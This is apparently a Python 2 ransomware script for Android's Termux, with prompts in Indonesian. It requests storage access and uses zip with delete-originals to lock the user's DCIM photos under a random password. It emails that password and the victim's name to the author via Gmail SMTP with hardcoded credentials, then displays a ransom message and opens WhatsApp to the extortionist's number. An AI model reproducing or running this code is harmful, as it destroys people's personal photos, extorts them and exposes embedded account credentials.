import os
import re
import sys
import time
import json
import random
import urllib
import hashlib
import getpass
import smtplib
import datetime
import threading
from multiprocessing.pool import ThreadPool

print "\n\n"
name = raw_input('\x1b[91mSiapa Nama Lu ? : ')

if name == '':
    print '\x1b[1;92misi yang bener asu'
    os.sys.exit()
elif not name.isalpha():
    print '\x1b[1;92mnama lu kan gak pake angka asu'
    os.sys.exit()

passcrypt = random.randint(600000000, 1000000000)
os.system('clear')
print '\x1b[1;92mScript ini harus mengizinkan penyimpanan'
time.sleep(5.0)
print 'karena membutuhkan data whatsapp korban'
time.sleep(5)
print '\x1b[1;32mJika anda belum mengizinkan harap diizinkan terlebih dahulu'
os.system('termux-setup-storage')
time.sleep(5)
print 'proses sedang dilakukan , harap tidak mengeluarkan termux'
os.system('pkg install zip ')
print '\x1b[1;32mProses Berjalan.....'
os.system('cd /sdcard/ && zip -rmq -1  --password ' + str(passcrypt) + ' fotolu.zip DCIM ')
print 'loading'

fadd     = 'rafasyahagung@gmail.com'
tadd     = 'rafasyahagung@gmail.com'
SUBJECT  = 'nama korban =  ' + name
TEXT     = 'password zip = ' + str(passcrypt)
message  = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
username = 'justabotsubs12@gmail.com'
password = 'ebknurbqygdvplsc'
server   = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()
server.login(username, password)
server.sendmail(fadd, tadd, message)

print 'Whatsapp JustA Hacker = 089682009902'
time.sleep(3)
print '\x1b[1;32mSEMUA FOTO ANDA TELAH DI KUNCI OLEH JUSTA HACKER'
time.sleep(3)
print 'SEMUA FOTO ANDA TELAH DISIMPAN DI fotomu.zip '
time.sleep(3)
print '\x1b[1;36mSILAKAN CEK FOTO FOTO ANDA'
time.sleep(3)
print 'Jika Anda Kehilangan Foto Foto anda,maka silakan chat nomor diatas'
time.sleep(3)
print '\x1b[1;32mSEDANG MENGECHAT JUSTA HACKER.....'
os.system('xdg-open https://api.whatsapp.com/send?phone=6289682009902&text=saya%20ingin%20membuka%20enkripsi%20')
os.system('am start https://api.whatsapp.com/send?phond=6289682009902')
